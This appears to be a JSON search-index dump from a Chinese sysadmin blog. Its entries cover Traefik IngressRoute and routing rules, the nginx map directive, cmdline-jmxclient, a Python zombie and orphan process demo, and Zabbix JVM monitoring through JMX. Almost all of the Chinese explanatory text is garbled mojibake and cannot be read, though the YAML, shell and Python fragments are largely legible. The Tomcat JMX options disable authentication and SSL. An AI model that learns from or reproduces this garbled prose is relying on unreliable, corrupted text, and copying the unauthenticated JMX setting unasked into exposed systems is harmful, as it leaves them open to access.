å¯é€‰é¡¹ none, lax, strict æˆ–è€…ä¸å†™ï¼Œ å¦‚æœSameSite=Noneé‚£ä¹ˆsecureå¿…é¡»ä¸ºtrue sameSite: none # è´Ÿè½½å‡è¡¡ç­–ç•¥, ç›®å‰åªæ”¯æŒè½®è¯¢ strategy: RoundRobin # å¯ä»¥å®šä¹‰å¤šä¸ª service ä¹‹é—´çš„è®¿é—®æƒé‡æ¯”ä¾‹ weight: 10 # httpsç›¸å…³é…ç½® tls: # è¯ä¹¦ secret secretName: supersecret # å¼•ç”¨ TLSOption å¯¹è±¡, TLSOptionå…è®¸ç”¨æˆ·é…ç½®TLSè¿æ¥çš„ä¸€äº›å‚æ•°ã€‚ # https://doc.traefik.io/traefik/https/tls/#tls-options options: name: opt namespace: default # ä½¿ç”¨æŒ‡å®šçš„è¯ä¹¦è§£æå™¨è‡ªåŠ¨ç”Ÿæˆè¯ä¹¦, https://www.soulchild.cn/post/2198/ certResolver: foo # æŒ‡å®šå“ªäº›åŸŸåéœ€è¦å¯ç”¨tls, å¦‚æœå¯ç”¨äº†certResolverï¼Œä¼šå°†æ‰€æœ‰åŸŸåéƒ½å‘Let's Encrypt'sç”³è¯·è¯ä¹¦ domains: - main: example.net sans: - a.example.net - b.example.net - \"*.example.cn\" # å¼•ç”¨ TLSStore å¯¹è±¡, æˆ‘è®¤ä¸ºè¿™å°±æ˜¯é«˜çº§ç‰ˆçš„tls secret, å®ƒå¯ä»¥åŒ…å«å¤šä¸ªtls secret,è¿˜å¯ä»¥è®¾ç½®é»˜è®¤çš„tls secret, ä¹Ÿå¯ä»¥ä½¿ç”¨è¯ä¹¦è§£æå™¨è‡ªåŠ¨ç”³è¯·å’Œç»­æœŸè¯ä¹¦ store: name: public-tls namespace: traefik ","date":"2020-12-28 15:53","objectID":"/post/2159/:4:0","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"äº”ã€è·¯ç”±åŒ¹é…è§„åˆ™ Headers(`key`, `value`): åˆ¤æ–­è¯·æ±‚å¤´æ˜¯å¦å­˜åœ¨, key æ˜¯è¯·æ±‚å¤´åç§°ï¼Œvalueæ˜¯å€¼. ä¾‹å¦‚HeadersRegexp(\"User-Agent\", \"Chrome|IE\") HeadersRegexp(`key`, `regexp`): åŒä¸Š,å¯ä»¥ä½¿ç”¨æ­£åˆ™æ¥åŒ¹é…. ä¾‹å¦‚HeadersRegexp(\"User-Agent\", \"Chrome|IE\") Host(`example.com`, â€¦): æ£€æŸ¥Hostè¯·æ±‚å¤´,åˆ¤æ–­å…¶å€¼æ˜¯å¦ä¸ºç»™å®šä¹‹ä¸€. ä¾‹å¦‚ Host(`example.com`, `test.com`) HostHeader(`example.com`, â€¦): åŒä¸Š,å› ä¸ºå†å²åŸå› æ‰å­˜åœ¨çš„ HostRegexp(`example.com`, `{subdomain:[a-z]+}.example.com`, â€¦): åŒä¸Šï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™. Method(`GET`, â€¦): åŒ¹é…method (GET, POST, PUT, DELETE, PATCH, HEAD). ä¾‹å¦‚ Method(`GET`, `POST`, `PUT`) Path(`/path`, `/articles/{cat:[a-z]+}/{id:[0-9]+}`, â€¦): åŒ¹é…ç¡®åˆ‡çš„è¯·æ±‚è·¯å¾„ã€‚æ¥å—æ­£åˆ™è¡¨è¾¾å¼ PathPrefix(`/products/`, `/articles/{cat:[a-z]+}/{id:[0-9]+}`): åŒ¹é…è¯·æ±‚å‰ç¼€è·¯å¾„ã€‚æ¥å—æ­£åˆ™è¡¨è¾¾å¼ Query(`foo=bar`, `bar=baz`): åŒ¹é…æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•° ClientIP(`10.0.0.0/16`, `::1`): å¦‚æœå®¢æˆ·ç«¯IPæ˜¯ç»™å®šçš„IP/CIDRä¹‹ä¸€ï¼Œåˆ™åŒ¹é…ã€‚å®ƒæ¥å—IPv4, IPv6å’ŒCIDRæ ¼å¼ã€‚æ³¨æ„å®ƒåªåŒ¹é…å®¢æˆ·ç«¯IP, ä¹Ÿå°±æ˜¯remote ipã€‚ ","date":"2020-12-28 15:53","objectID":"/post/2159/:5:0","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"æ­£åˆ™è¯­æ³• æ­£åˆ™çš„æ ¼å¼ä¸º {name: regexp}, nameéšä¾¿å†™, regexpæ˜¯æ­£åˆ™ ","date":"2020-12-28 15:53","objectID":"/post/2159/:5:1","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"è¿ç®—ç¬¦ å¯ä»¥ä½¿ç”¨ \u0026\u0026, ||, !, () å°†å¤šç§è§„åˆ™ç»„å’Œä½¿ç”¨ ä¾‹å¦‚: (Host(`example.com`, `test.com`) || PathPrefix(`/products/`)) \u0026\u0026 ClientIP(`10.0.0.0/16`) ","date":"2020-12-28 15:53","objectID":"/post/2159/:5:2","tags":["k8s","traefik"],"title":"traefik-IngressRouteé…ç½®è¯¦è§£(äºŒ)","uri":"/post/2159/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"åœ¨traefikä¸­ä¸€ä¸ªè¯·æ±‚çš„èµ°å‘ å…¥å£ç‚¹ -\u003e è·¯ç”±å™¨ -\u003e middleware -\u003e service -\u003e upstream Traefikä¸­çš„é…ç½®å¯ä»¥å¼•ç”¨ä¸¤ç§ä¸åŒçš„å†…å®¹ï¼š è·¯ç”±é…ç½®ï¼ˆç§°ä¸ºåŠ¨æ€é…ç½®ï¼‰è·¯ç”±çš„é…ç½® å¯åŠ¨é…ç½®ï¼ˆç§°ä¸ºé™æ€é…ç½®ï¼‰traefikæœ¬èº«çš„é…ç½® ","date":"2020-12-28 15:25","objectID":"/post/2158/:0:0","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"ä¸€ã€åŠ¨æ€é…ç½®(provider) åŠ¨æ€é…ç½®å®šä¹‰ traefik å¦‚ä½•â€‹â€‹å¤„ç†è¯·æ±‚ã€‚æ­¤é…ç½®å¯ä»¥çƒ­é‡è½½ï¼Œä¸ä¼šé€ æˆä»»ä½•è¯·æ±‚ä¸­æ–­æˆ–è¿æ¥ä¸¢å¤±ã€‚traefik ä» provider ä¸­è·å–åŠ¨æ€é…ç½®, æ¯”å¦‚ traefik ä» kubernetes-Ingress ä¸­è·å–é…ç½®,é‚£ä¹ˆå®ƒå¯¹åº”çš„ provider name æ˜¯ kubernetesã€‚ providersåŒ…æ‹¬ï¼šdocker,kubernetes-Ingress,kubernetes-IngressRoute,rancher,consul,zookeeperç­‰ç­‰ã€‚ ä¸åŒproviderå¯¹åº”çš„åç§° Provider Namespace åœ¨ Traefik åŠ¨æ€é…ç½®ä¸­å£°æ˜æŸäº›å¯¹è±¡æ—¶ï¼Œä¾‹å¦‚ä¸­é—´ä»¶ã€æœåŠ¡ã€TLS é€‰é¡¹ã€TCPï¼Œå®ƒä»¬ä½äºè¿™ä¸ª provider çš„å‘½åç©ºé—´ä¸­ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨å¤šä¸ª provider æ—¶ï¼Œå¦‚æœå¸Œæœ›å¼•ç”¨åœ¨å¦ä¸€ä¸ª provider ä¸­å£°æ˜çš„æ­¤ç±»å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œå¼•ç”¨åƒä¸­é—´ä»¶è¿™æ ·çš„è·¨æä¾›è€…å¯¹è±¡ï¼‰ï¼Œåˆ™å¼•ç”¨çš„å¯¹è±¡åç§° æ ¼å¼ä¸º \u003cresource-name\u003e@\u003cprovider-name\u003e , kubernetes æ¯”è¾ƒç‰¹æ®Š, å› ä¸º kubernetes ä¹Ÿæœ‰Namespaceçš„æ¦‚å¿µï¼Œä»–éœ€è¦ä½¿ç”¨è¿™æ ·çš„æ ¼å¼ \u003cmiddleware in k8s namespace\u003e-\u003cmiddleware name\u003e@kubernetescrdã€‚ ä¾‹å¦‚ä½¿ç”¨ kubernetes CRD å£°æ˜äº†ä¸€ä¸ªä¸­é—´ä»¶ï¼Œä»–çš„ provider name æ˜¯ kubernetescrd apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: stripprefix namespace: appspace spec: stripPrefix: prefixes: - /stripit ä½¿ç”¨ ingress å¼•ç”¨ä»– apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: ingress namespace: appspace annotations: # å¼•ç”¨æ ¼å¼ \u003cmiddleware in k8s namespace\u003e-\u003cmiddleware-name\u003e@kubernetescrd \"traefik.ingress.kubernetes.io/router.middlewares\": appspace-stripprefix@kubernetescrd spec: ... ä½¿ç”¨ IngressRoute å¼•ç”¨å®ƒ apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: ingressroutestripprefix spec: entryPoints: - web routes: - match: Host(`example.com`) kind: Rule services: - name: whoami port: 80 middlewares: - name: stripprefix # çœç•¥@kubernetescrd namespace: appspace åŠ¨æ€é…ç½®çš„æ–‡æ¡£: https://doc.traefik.io/traefik/routing/overview/ ","date":"2020-12-28 15:25","objectID":"/post/2158/:1:0","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"äºŒã€é™æ€é…ç½® åœ¨traefikä¸­å®šä¹‰äº†ä¸‰ç§ä¸åŒçš„å®šä¹‰æ–¹å¼ åœ¨é…ç½®æ–‡ä»¶ä¸­ åœ¨å‘½ä»¤è¡Œå‚æ•° åœ¨ç¯å¢ƒå˜é‡ä¸­ ä¼˜å…ˆçº§æŒ‰ç…§ä¸Šé¢çš„é¡ºåº ","date":"2020-12-28 15:25","objectID":"/post/2158/:2:0","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"é…ç½®æ–‡ä»¶ä½ç½® åœ¨å¯åŠ¨æ—¶,traefikæœç´¢ä¸€ä¸ªåä¸ºtraefik.toml(æˆ–traefik.ymlæˆ–traefik.yaml)çš„æ–‡ä»¶ æœç´¢è·¯å¾„å¦‚ä¸‹: /etc/traefik/ $XDG_CONFIG_HOME/ $HOME/.config/ . å½“å‰å·¥ä½œç›®å½• ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æ¥é…ç½® traefik --configFile=foo/bar/myconfigfile.toml ","date":"2020-12-28 15:25","objectID":"/post/2158/:2:1","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"ä¸‰ã€å…¥å£ç‚¹ Traefikçš„å…¥å£ç‚¹ï¼ˆEntry Pointï¼‰æ˜¯æŒ‡å®¢æˆ·ç«¯ä¸Traefikä¹‹é—´é€šä¿¡çš„åè®®å’Œç«¯å£ã€‚å®ƒå®šä¹‰äº†å¦‚ä½•æ¥æ”¶å’Œå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„ç½‘ç»œæµé‡ï¼Œå¹¶å°†å…¶è·¯ç”±åˆ°æ­£ç¡®çš„æœåŠ¡å®ä¾‹ã€‚ Traefikæ”¯æŒå¤šç§ç±»å‹çš„å…¥å£ç‚¹ï¼ŒåŒ…æ‹¬HTTPã€HTTPSã€TCPå’ŒUDPï¼Œæ¯ä¸ªå…¥å£ç‚¹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€åç§°ï¼Œå¯ä»¥åŒæ—¶å¯ç”¨å¤šä¸ªå…¥å£ç‚¹ã€‚ å…¥å£ç‚¹å±äºé™æ€é…ç½®,é…ç½®å‚è€ƒå¦‚ä¸‹ entryPoints: customName: # ç›‘å¬åœ°å€å’Œç«¯å£,é»˜è®¤tcp address: \":8888\" # æŒ‡å®šudp\":9999/udp\" http2: # ä¸€ä¸ªTCPè¿æ¥å¯ä»¥åŒæ—¶å¤„ç†å¤šå°‘ä¸ªè¯·æ±‚, é»˜è®¤250 maxConcurrentStreams: 42 # å¯ç”¨ HTTP/3 åè®®ã€‚ http3: advertisedPort: 8888 forwardedHeaders: # insecure: true # å§‹ç»ˆä¿¡ä»» X-Forwarded-* å¤´, é»˜è®¤false # æŒ‡å®šä¿¡ä»»çš„ä¸Šå±‚ä»£ç†IPã€‚å¦‚æœè¯·æ±‚traefikçš„ipä¸åœ¨è¿™ä¸ªåˆ—è¡¨ä¸­,é‚£ä¹ˆtraefikä¼šå°† X-Forwarded-For è¦†å†™ä¸ºremote_addr # å¦‚æœè¯·æ±‚traefikçš„ipåœ¨è¿™ä¸ªåˆ—è¡¨ä¸­, é‚£ä¹ˆtraefikä¼šåœ¨ X-Forwarded-For åé¢è¿½åŠ remote_addr # å¦‚æœæ²¡æœ‰æŒ‡å®šä¿¡ä»»çš„IP, é‚£ä¹ˆtraefikä¼šå°† X-Forwarded-For è¦†å†™ä¸ºremote_addr, é™¤éinsecure=true trustedIPs: - \"127.0.0.1/32\" - \"192.168.1.7\" transport: # ä¼˜é›…åœæ­¢ lifeCycle: # æ¥æ”¶åˆ°åœæ­¢ä¿¡å·åï¼Œä¿æŒæ¥å—è¯·æ±‚çš„æ—¶é—´, é»˜è®¤0sã€‚ çœ‹æºç å°±æ˜¯ä¸€ä¸ªsleep, ç„¶åèµ°åˆ°graceTimeOutï¼Œä¸çŸ¥é“æœ‰å•¥ç”¨ã€‚ requestAcceptGraceTimeout: 42s # æ¥æ”¶åˆ°åœæ­¢ä¿¡å·å, åœæ­¢æ¥æ”¶è¯·æ±‚,å¤„ç†æœªå¤„ç†å®Œçš„è¯·æ±‚, åˆ°æŒ‡å®šçš„æ—¶é—´å¼ºåˆ¶å…³é—­serverã€‚ graceTimeOut: 42s respondingTimeouts: # è¯»å–æ•´ä¸ªè¯·æ±‚(åŒ…æ‹¬body)çš„æœ€é•¿æŒç»­æ—¶é—´,é»˜è®¤0,æ²¡æœ‰è¶…æ—¶ã€‚ readTimeout: 42 # ä»è¯·æ±‚å¤´è¯»å–ç»“æŸåˆ°å“åº”å†™å…¥ç»“æŸçš„æ—¶é—´ã€‚é»˜è®¤0,æ²¡æœ‰è¶…æ—¶ã€‚ writeTimeout: 42 # ç©ºé—²è¿æ¥åœ¨å…³é—­ä¹‹å‰ä¿æŒç©ºé—²çš„æœ€é•¿æ—¶é—´ã€‚é»˜è®¤180s idleTimeout: 42 # å¼€å¯proxyProtocolåè®® proxyProtocol: # ä¿¡ä»»æ‰€æœ‰IP # insecure: true # åªæœ‰ä¿¡ä»»çš„IPæ‰ä¼šä½¿ç”¨Proxy ProtocolæŠ¥æ–‡ä¸­çš„å®¢æˆ·ç«¯IP, ä¸ä¿¡ä»»çš„IPä¸ä¼šä½¿ç”¨,å¹¶æ‹’ç»å“åº” trustedIPs: - \"127.0.0.1\" - \"192.168.0.1\" ","date":"2020-12-28 15:25","objectID":"/post/2158/:3:0","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"å››ã€è·¯ç”±å™¨ https://doc.traefik.io/traefik/routing/routers/#services è·¯ç”±å™¨æ”¯æŒHTTPã€TCPã€UDPåè®®ï¼Œä»–çš„å®šä¹‰å°±æ˜¯è·¯ç”±è§„åˆ™ï¼ŒæŒ‰ç…§ä¸åŒçš„hostã€pathã€headerç­‰ä¿¡æ¯è½¬å‘åˆ°ä¸åŒçš„æœåŠ¡ä¸­ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œè·¯ç”±å™¨å¯èƒ½ä¼šä½¿ç”¨ä¸­é—´ä»¶æ¥æ›´æ–°è¯·æ±‚ã€‚ ä¸€ä¸ªè·¯ç”±å™¨é»˜è®¤ä¼šæ¥æ”¶æ‰€æœ‰ å…¥å£ç‚¹ çš„è¯·æ±‚ï¼Œä¹Ÿå¯ä»¥æ˜¾å¼çš„æŒ‡å®šä»…æ¥æ”¶æ¥è‡ªå“ªäº›å…¥å£ç‚¹çš„è¯·æ±‚ã€‚ ","date":"2020-12-28 15:25","objectID":"/post/2158/:4:0","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"äº”ã€æœåŠ¡ æœåŠ¡åŒ…å«äº†å®é™…çš„upstream servers, å®ƒå¯ä»¥ç”±ç®€å•çš„k8s serviceæä¾›, ä¹Ÿå¯ä»¥ç”±æ‹¥æœ‰é«˜çº§åŠŸèƒ½çš„TraefikServiceæä¾› æœåŠ¡ä¸­è¿˜å¯ä»¥åŒ…å«æœåŠ¡ï¼Œæ¯”å¦‚ Host ä¸º example.com çš„æµé‡è·¯ç”±åˆ°äº†service A, service A åŒ…å«äº† service B å’Œ service C,å¹¶è®¾ç½®äº†å¯¹åº”çš„æƒé‡ï¼Œé‚£ä¹ˆè·¯ç”±è¿‡æ¥çš„æµé‡ä¼šæŒ‰ç…§æƒé‡è½¬å‘åˆ°service B å’Œ service Cä¸­, è¿™å¾ˆé€‚ç”¨äºç°åº¦å‘å¸ƒ ","date":"2020-12-28 15:25","objectID":"/post/2158/:5:0","tags":["traefik"],"title":"traefik-æ¦‚å¿µç®€ä»‹(ä¸€)","uri":"/post/2158/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"è¯­æ³•:map string $variable { ... } é…ç½®å­—æ®µ:http å«ä¹‰: åŒ¹é…ç¬¬ä¸€ä¸ªå‚æ•°,å°†è‡ªå·±æŒ‡å®šçš„ç»“æœèµ‹å€¼ç»™ç¬¬äºŒä¸ªå‚æ•° ä¸¾ä¾‹: å¦‚æœ$http_user_agentçš„å€¼ä¸~Opera MiniåŒ¹é…æˆåŠŸï¼Œ$mobileçš„å€¼å°±æ˜¯1ã€‚å¦åˆ™$mobileçš„å€¼å°±æ˜¯0 map $http_user_agent $mobile { default 0; \"~Opera Mini\" 1; } å¯¹äºåŒºåˆ†å¤§å°å†™çš„åŒ¹é…ï¼Œæ­£åˆ™è¡¨è¾¾å¼åº”ä»~ç¬¦å·å¼€å§‹ï¼Œå¯¹äºä¸åŒºåˆ†å¤§å°å†™çš„åŒ¹é…ï¼Œæ­£åˆ™è¡¨è¾¾å¼åº”ä»~*ç¬¦å·å¼€å§‹ã€‚ mapè¿˜æ”¯æŒä»¥ä¸‹ç‰¹æ®Šå‚æ•°ï¼š default value å¦‚æœæºå€¼ä¸åŒ¹é…ä»»ä½•æŒ‡å®šçš„å˜ä½“ï¼Œåˆ™è®¾ç½®ç»“æœå€¼ã€‚å¦‚æœæœªæŒ‡å®šdefaultï¼Œåˆ™é»˜è®¤ç»“æœå€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ hostnames æŒ‡ç¤ºæºå€¼æ˜¯å¸¦æœ‰å‰ç¼€æˆ–åç¼€çš„ä¸»æœºå(xxx.com,xxx.cn,www.xxx.cn) ä½¿ç”¨hostnamesåï¼ŒåŒ¹é…åŸŸåæ—¶å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ *.xxx.com xxx.com xxx.* #ä¸Šé¢çš„é…ç½®ä¹Ÿå¯ä»¥ç®€å†™æˆ############# .xxx.com xxx.* æœ€ç»ˆåœ¨é…ç½®æ–‡ä»¶ä¸­å‘ˆç° map $http_referer $referer_ok { hostnames; .xxx.com 1; xxx.* 1; default 0; } include file å¼•å…¥ä¸€ä¸ªå˜é‡æ–‡ä»¶ volatile æŒ‡æ˜è¯¥å˜é‡ä¸å¯ç¼“å­˜ ","date":"2020-12-28 14:12","objectID":"/post/2157/:0:0","tags":["nginx"],"title":"nginx mapæŒ‡ä»¤ä½¿ç”¨","uri":"/post/2157/"},{"categories":["å…¶ä»–"],"content":"å·¥å…·ä¸‹è½½ï¼šhttp://crawler.archive.org/cmdline-jmxclient/cmdline-jmxclient-0.10.3.jar å®˜æ–¹æ–‡æ¡£ï¼šhttp://crawler.archive.org/cmdline-jmxclient/ æŸ¥çœ‹æ‰€æœ‰beanåç§°ï¼š java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:12347 è·å–beanå±æ€§çš„åç§°: java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:12347 'Catalina:name=\"http-nio-8888\",type=ThreadPool' æœ€ç»ˆè·å–beanå±æ€§çš„å€¼: java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:12347 'Catalina:name=\"http-nio-8888\",type=ThreadPool' currentThreadsBusy ","date":"2020-12-24 18:32","objectID":"/post/2151/:0:0","tags":["java"],"title":"cmdline-jmxclientè·å–jvmçš„Mbeançº¿ç¨‹ä¿¡æ¯","uri":"/post/2151/"},{"categories":["å…¶ä»–"],"content":" \"\"\" åƒµå°¸è¿›ç¨‹æ˜¯å½“å­è¿›ç¨‹æ¯”çˆ¶è¿›ç¨‹å…ˆç»“æŸï¼Œè€Œçˆ¶è¿›ç¨‹åˆæ²¡æœ‰å›æ”¶å­è¿›ç¨‹ï¼Œé‡Šæ”¾å­è¿›ç¨‹å ç”¨çš„èµ„æºï¼Œæ­¤æ—¶å­è¿›ç¨‹å°†æˆä¸ºä¸€ä¸ªåƒµå°¸è¿›ç¨‹ã€‚ \"\"\" from multiprocessing import Process import os import time # def task(n): # print('%s is running' % os.getpid()) # # è·å–çˆ¶pid # print('ppid is %s' % os.getppid()) # time.sleep(n) # print('%s is done' % os.getpid()) # # # if __name__ == '__main__': # p = Process(target=task, args=(10,)) # p.start() # print('ä¸»', os.getpid()) # time.sleep(10000) # è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ï¼Œå¯ä»¥å®ç°åƒµå°¸è¿›ç¨‹,è¿›ç¨‹çŠ¶æ€å˜æˆäº†\"Z\" # ps aux | grep [3]8194 # soulchild 38194 0.0 0.0 0 0 ?? Z 9:00AM 0:00.00 (Python) \"\"\" å­¤å„¿è¿›ç¨‹æŒ‡çš„æ˜¯åœ¨å…¶çˆ¶è¿›ç¨‹æ‰§è¡Œå®Œæˆæˆ–è¢«ç»ˆæ­¢åä»ç»§ç»­è¿è¡Œçš„ä¸€ç±»è¿›ç¨‹ã€‚ è¿™äº›å­¤å„¿è¿›ç¨‹å°†è¢«initè¿›ç¨‹(è¿›ç¨‹å·ä¸º1)æ‰€æ”¶å…»ï¼Œå¹¶ç”±initè¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†ç®¡ç†å·¥ä½œã€‚ \"\"\" import os mpid = os.getpid() ppid = os.getppid() print(\"æˆ‘æ˜¯ä¸»è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹idï¼š%s,çˆ¶è¿›ç¨‹id:%s\" % (mpid, ppid)) # forkä¼šç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹,åç»­ä»£ç ä¸»è¿›ç¨‹å’Œå­è¿›ç¨‹éƒ½ä¼šæ‰§è¡Œ # pidçš„å€¼æœ‰ä¸¤ä¸ªï¼š # åœ¨çˆ¶è¿›ç¨‹ä¸­pidçš„å€¼ä¸ºå­è¿›ç¨‹çš„pid # åœ¨å­è¿›ç¨‹ä¸­pidçš„å€¼ä¸º0 pid = os.fork() if pid == 0: print(\"æˆ‘æ˜¯å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹id:%s,çˆ¶è¿›ç¨‹id:%s\" % (os.getpid(), os.getppid())) time.sleep(1) print(\"æˆ‘æ˜¯å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹id:%s,çˆ¶è¿›ç¨‹id:%s\" % (os.getpid(), os.getppid())) else: print(\"æˆ‘æ˜¯ä¸»è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹id:%s,çˆ¶è¿›ç¨‹id:%s,æˆ‘çš„å­è¿›ç¨‹id:%s\" % (os.getpid(), os.getppid(), pid)) # ä¸Šé¢çš„ä»£ç éœ€è¦åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ,åœ¨pycharmä¸­æ‰§è¡Œçœ‹ä¸å‡ºæ•ˆæœ # æ‰§è¡Œç»“æœ # [soulchild@MBP ~]$ python3 03-åƒµå°¸è¿›ç¨‹å­¤å„¿è¿›ç¨‹.py # æˆ‘æ˜¯ä¸»è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹idï¼š38979,çˆ¶è¿›ç¨‹id:12937 # æˆ‘æ˜¯ä¸»è¿›ç¨‹ï¼Œä¸»è¿›ç¨‹id:38979,çˆ¶è¿›ç¨‹id:12937,æˆ‘çš„å­è¿›ç¨‹id:38980 # æˆ‘æ˜¯å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹id:38980,çˆ¶è¿›ç¨‹id:38979 # [soulchild@MBP ~]$ æˆ‘æ˜¯å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹id:38980,çˆ¶è¿›ç¨‹id:1 ","date":"2020-12-24 14:05","objectID":"/post/2139/:0:0","tags":["linux","python"],"title":"åƒµå°¸è¿›ç¨‹ä¸å­¤å„¿è¿›ç¨‹","uri":"/post/2139/"},{"categories":["ç›‘æ§"],"content":"ä¸€ã€ç¼–è¯‘å®‰è£…zabbix-java-gateway è¿›å…¥zabbixæºç åŒ…è·¯å¾„ cd /server/packages/zabbix-4.0.16 ./configure --enable-java --prefix=/application/zabbix-java-gateway make \u0026\u0026 make install ","date":"2020-12-24 11:56","objectID":"/post/2138/:1:0","tags":["zabbix","jvm"],"title":"zabbixä½¿ç”¨zabbix-java-gatewayç›‘æ§JVM","uri":"/post/2138/"},{"categories":["ç›‘æ§"],"content":"äºŒã€å¯åŠ¨ su - zabbix -c /application/zabbix-java-gateway/sbin/zabbix_java/startup.sh ","date":"2020-12-24 11:56","objectID":"/post/2138/:2:0","tags":["zabbix","jvm"],"title":"zabbixä½¿ç”¨zabbix-java-gatewayç›‘æ§JVM","uri":"/post/2138/"},{"categories":["ç›‘æ§"],"content":"ä¸‰ã€zabbix_serverçš„é…ç½®æ–‡ä»¶æ·»åŠ å¦‚ä¸‹ä¸¤ä¸ªå‚æ•° # æˆ‘çš„zabbix-serverå’Œzabbox-java-gatewayè£…åœ¨åŒä¸€å°æœºå™¨ä¸Šäº†ï¼Œæ‰€ä»¥ç”¨çš„127.0.0.1 JavaGateway=127.0.0.1 JavaGatewayPort=10052 StartJavaPollers=5 é‡å¯zabbix-server systemctl restart zabbix-server å¦‚æœéœ€è¦æ—¥å¿—è°ƒè¯•ï¼Œå¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶/application/zabbix-java-gateway/sbin/zabbix_java/lib/logback.xmlå°†infoæ”¹ä¸ºdebugï¼Œæ—¥å¿—çš„è¾“å‡ºåœ¨/tmp/zabbix_java.log \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"FILE\" /\u003e \u003c/root\u003e ","date":"2020-12-24 11:56","objectID":"/post/2138/:3:0","tags":["zabbix","jvm"],"title":"zabbixä½¿ç”¨zabbix-java-gatewayç›‘æ§JVM","uri":"/post/2138/"},{"categories":["ç›‘æ§"],"content":"å››ã€tomcatæ·»åŠ jmxé…ç½® 1.vim /application/tomcat/bin/catalina.sh åœ¨ç¬¬äºŒè¡Œæ·»åŠ å³å¯ï¼Œä¸‹é¢çš„ipç«¯å£å·éœ€è¦ä¿®æ”¹ä¸ºzabbixå¯ä»¥è¿æ¥ CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.port=12345 -Djava.rmi.server.hostname=127.0.0.1\" 2.é»˜è®¤æƒ…å†µä¸‹é™¤äº†12345ç«¯å£å¤–,è¿˜ä¼šå¼€æ”¾å¦ä¸€ä¸ªRMIéšæœºç«¯å£,è¿™ä¸ªç«¯å£ä¹Ÿéœ€è¦å¯¹zabbix-java-gatewayå¼€æ”¾.ä½†æ˜¯éšæœºç«¯å£ä¸å¥½å†™è§„åˆ™ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸ºå›ºå®šç«¯å£æ¥è§£å†³ ä¸‹è½½ä¸€ä¸ªæ‰©å±•jaråŒ… cd /application/tomcat/lib wget http://archive.apache.org/dist/tomcat/tomcat-8/v8.5.54/bin/extras/catalina-jmx-remote.jar ä¿®æ”¹tomcatä¸­server.xml,åœ¨æœ€åä¸€ä¸ª\u003cListener className=.../\u003eä¸‹é¢æ·»åŠ å³å¯ \u003cListener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiServerPortPlatform=\"12346\" rmiRegistryPortPlatform=\"12345\"/\u003e 3.é‡å¯tomcat /application/tomcat/bin/shutdown.sh /application/tomcat/bin/startup.sh ","date":"2020-12-24 11:56","objectID":"/post/2138/:4:0","tags":["zabbix","jvm"],"title":"zabbixä½¿ç”¨zabbix-java-gatewayç›‘æ§JVM","uri":"/post/2138/"},{"categories":["ç›‘æ§"],"content":"äº”ã€é…ç½®zabbix-web(ä¸ç”¨è‡ªå¸¦æ¨¡æ¿å¯è·³è¿‡3å’Œ4æ­¥) 1.é€‰æ‹©è¦ç›‘æ§çš„ä¸»æœº 26400-q0kwtfcx3e8.png 2.æ·»åŠ jmxçš„åœ°å€é…ç½® 